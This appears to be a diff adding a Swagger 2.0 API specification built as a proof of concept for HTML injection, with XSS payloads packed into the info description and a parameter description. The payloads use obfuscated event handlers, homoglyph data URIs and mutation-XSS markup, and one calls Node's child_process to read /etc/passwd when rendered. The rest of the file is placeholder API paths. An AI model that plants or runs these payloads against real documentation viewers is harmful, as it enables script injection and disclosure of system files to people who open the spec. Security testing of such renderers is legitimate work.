@@ -1,0 +1,70 @@
+swagger: '2.0'
+info:
+  title: HTML INJECTION FOR POC
+  description: |
+    <img/src/onerror=.1|alert(`hide`)>
+    <select><noembed></select><script x='a@b'a> y='a@b'//a@b%0a\u0061lert('1')</script x>
+    <h1/%6f%6e/oNclicK=alert`hacked`>CLICK HERE
+    <img src=# onerror="require('child_process').exec('cat /etc/passwd',(error, stdout, stderr)=>{ alert(`stdout: ${stdout}`); });">
+"><img src=x onerror=prompt(document.domain)>
+<embed src='daТa:text/html;bΑse64,R0lGODlhAQABAAD'onload=alert('xss');>
+<embed src="http://xss.com" <style style="background-img('daТa:image/gif;bΑse64,R0lGODlhAQABAAD/')" onload=alert('0');>
+<style>*{transition%3Acolor+1s}*%3Ahover{color%3Ared}<%2Fstyle><brute%2Fontransitionend%3Dalert(1)>
+
+<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(2)>
+
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  "/abir":
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - somettext
+      operationId: findAccounts
+      summary: this is example text
+  "/malformed_by_abir":
+    delete:
+      parameters:
+      - description: |
+          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<h1>hide here</h1>"></form>
+
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - abir
+      operationId: abir
+      summary: abir
+    get:
+      parameters:
+      - description: this is example text
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - abir
+      operationId: some_operation
+      summary: this is example text
